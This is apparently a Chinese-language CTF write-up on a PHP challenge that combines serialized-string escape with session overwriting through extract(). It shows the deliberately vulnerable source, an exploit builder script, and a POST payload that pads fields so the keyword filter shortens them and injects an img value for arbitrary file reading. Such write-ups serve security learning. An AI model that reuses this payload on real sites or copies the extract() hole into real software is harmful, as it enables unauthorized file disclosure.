# 考点：

# 1.序列化字符串逃逸

# 2. extract变量覆盖session



index.php

```javascript
<?php

$function = @$_GET['f'];

function filter($img){
    $filter_arr = array('php','flag','php5','php4','fl1g');
//    将数组转换为字符串，并用|连接
    $filter = '/'.implode('|',$filter_arr).'/i';
//    搜索img中含有的fileter部分，替换为replacement
    return preg_replace($filter,'',$img);
}


if($_SESSION){
    unset($_SESSION);
}

$_SESSION["user"] = 'guest';
$_SESSION['function'] = $function;

//容易出现变量覆盖漏洞，从数组中将变量导入到当前的变量表
extract($_POST);

if(!$function){
    echo '<a href="index.php?f=highlight_file">source_code</a>';
}

if(!$_GET['img_path']){
    $_SESSION['img'] = base64_encode('guest_img.png');
}else{
//    sha1加密
    $_SESSION['img'] = sha1(base64_encode($_GET['img_path']));
}

//过滤序列化后的session
$serialize_info = filter(serialize($_SESSION));


if($function == 'highlight_file'){
    highlight_file('index.php');
}else if($function == 'phpinfo'){
    eval('phpinfo();'); //maybe you can find something in here!
}else if($function == 'show_image'){
    $userinfo = unserialize($serialize_info);
    //尝试利用这里来读flag
    echo file_get_contents(base64_decode($userinfo['img']));

}
echo 'img: '. $_SESSION['img']."</br>";
echo 'user: '.$_SESSION['user']."</br>";
echo 'function: '.$_SESSION['function']."</br>";
//echo 'test: '.$test."</br>";
echo "$serialize_info";
```



exp.php

```javascript
<?php

//   /index.php?f=show_image&img_path=flag
echo strlen('guest";s:8:"function";s:69:"show_image');
$_SESSION["user"]='guestphpphpphpphpphpphpphpphpphpphpphp';
//$_SESSION['function']='show_image';
$_SESSION['function']='show_image";s:8:"function";s:10:"show_image";s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw==";}';
$_SESSION['img'] = sha1(base64_encode('h11ba1'));
echo serialize($_SESSION);
```



该题的坑点在于，extract覆盖session时，session只能写为_session[user]不能写为_session['user']

生成的poc一定要注意符合序列化格式，很多地方需要微调



```javascript
_SESSION[user]=guestphpphpphpphpphpphpphpphpphpphpphp
&_SESSION[function]=show_image";s:8:"function";s:10:"show_image";s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw==";}
```





